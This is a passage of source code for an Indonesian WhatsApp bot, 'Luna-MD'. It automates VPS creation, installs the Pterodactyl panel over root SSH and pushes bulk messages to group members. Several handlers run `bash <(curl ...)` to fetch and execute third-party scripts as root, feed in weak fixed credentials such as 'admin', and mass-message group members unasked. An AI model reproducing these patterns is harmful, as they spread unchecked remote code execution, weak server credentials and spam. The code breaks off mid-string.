if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "welcome": {
if (!m.isGroup) return reply(mess.group)
if (!isOwner) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

case 'antilinkch': {
if (!m.isGroup) return reply(mess.group)
if (!isOwner) return reply(mess.owner)
 if (!antichannel[m.chat]) antichannel[m.chat] = { active: false, warnings: {}, antichannel: false }

 const argsLower = q.toLowerCase();
 if (argsLower === 'on') {
 antichannel[m.chat].antichannel = true;
 saveAntichannel();
 Reply('✅ Anti Link Channel WhatsApp AKTIF!');
 } else if (argsLower === 'off') {
 antichannel[m.chat].antichannel = false;
 saveAntichannel();
 Reply('❌ Anti Link Channel WhatsApp NONAKTIF!');
 } else {
 Reply(`Contoh:\n*${prefix}antichannel on*\n*${prefix}antichannel off*`);
 }
}
break

case "installpanel": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*?? Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await luna.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break 

case "startwings": 
case "swings": {
    if (!isOwner) return;

    let t = text.split('|');
    if (t.length < 3) return reply(example("ipvps|pwvps|token_node"));

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await Reply("*Berhasil menjalankan wings ✅*\nSilahkan cek panel anda 😋");
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                Reply('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('Kata sandi atau IP tidak valid');
    }).connect(connSettings);
}
break;

case "cvps": {
if (!text) return m.reply(example("hostname"))
return luna.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2026 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isOwner) return reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await luna.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

case 'installtema': {
        if (!isOwner) return reply(mess.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
    let menu = `
    Silahkan pilih tema
    `;
const MenuX = {
        interactiveMessage: {
            title: menu,
            footer: "Luna-MD",
            thumbnail: "https://img1.pixhost.to/images/6762/615404079_rizzhosting.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "Luna-MD",
                        url: "t.me/noxXza.exe",
                        copy_code: "Luna-MD",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "Luna-MD",
                        button_title: "𝙋𝙄𝙇𝙄𝙃 𝙏𝙃𝙀𝙈𝘼"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/noxXza.exe",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemaenigma",
                            id: `${prefix}installtemaenigma`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemanightcore",
                            id: `${prefix}installtemanightcore`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemastellar",
                            id: `${prefix}installtemastellar`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemabilling",
                            id: `${prefix}installtemabilling`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installtemanebula",
                            id: `${prefix}installtemanebula`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "installdepend",
                            id: `${prefix}installdepend`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "uninstallthema",
                            id: `${prefix}uninstallthema`
            })
          }
        ]
      }
    }
  };

  await luna.sendMessage(m.chat, MenuX, { quoted: qpayment });
}
break 

case "uninstallthema": {
if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) 
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); 
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemabilling": case "instaltemabiling": {
if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) 
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemastellar": case "installtemastelar": {
if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) 
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemanightcore": {
if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installdepend": {
    if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await m.reply("Berhasil install Depend silakan ketik .installnebula ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('11\n');
                stream.write('A\n');
                stream.write('Y\n');
                stream.write('Y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

case "installtemanebula": {
if (!isOwner) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "joingb": case "join": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await luna.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

case "pushkontak2": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await luna.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await luna.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await luna.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await luna.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await luna.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await luna.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case "pushkontak": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await luna.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return luna.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ${global.botname} • 2026`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

case 'cpanel': {
if (!isOwner) return m.reply(mess.owner)
if (!q) return m.reply(example("username"))
global.panel = [text.toLowerCase()]
 let menu = `
ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ
 `;
const MenuX = {
        interactiveMessage: {
            title: menu,
            footer: "Luna-MD",
            thumbnail: "https://files.catbox.moe/dnn77v.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "Luna-MD",
                        url: "t.me/noxXza.exe",
                        copy_code: "Luna-MD",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "Luna-MD",
                        button_title: "Pilih Ram Panel"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/noxXza.exe",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ᴄᴘᴀɴᴇʟ 𝟻ɢʙ",
                            id: `${prefix}5gb1`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ᴄᴘᴀɴᴇʟ 𝟼ɢʙ",
                            id: `${prefix}6gb1`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ᴄᴘᴀɴᴇʟ 𝟽ɢʙ",
                            id: `${prefix}7gb1`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ᴄᴘᴀɴᴇʟ 𝟾ɢʙ",
                            id: `${prefix}8gb1`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ᴄᴘᴀɴᴇʟ 𝟿ɢʙ",
                            id: `${prefix}9gb1`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ᴄᴘᴀɴᴇʟ ᴜɴʟɪᴍɪᴛᴇᴅ",
                            id: `${prefix}unli1`
            })
          }
        ]
      }
    }
  };

  await luna.sendMessage(m.chat, MenuX, { quoted: qpayment });
}
break 



case "5gb1": case "6gb1": case "7gb1": case "8gb1": case "9gb1": case "10gb1": case "unlimited1": case "unli1": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (global.panel == undefined) return m.reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "5gb1") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb1") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb1") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb1") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb1") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb1") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
?? *Login URL:* ${global.domain}  

   *👑 SPEK PANEL*
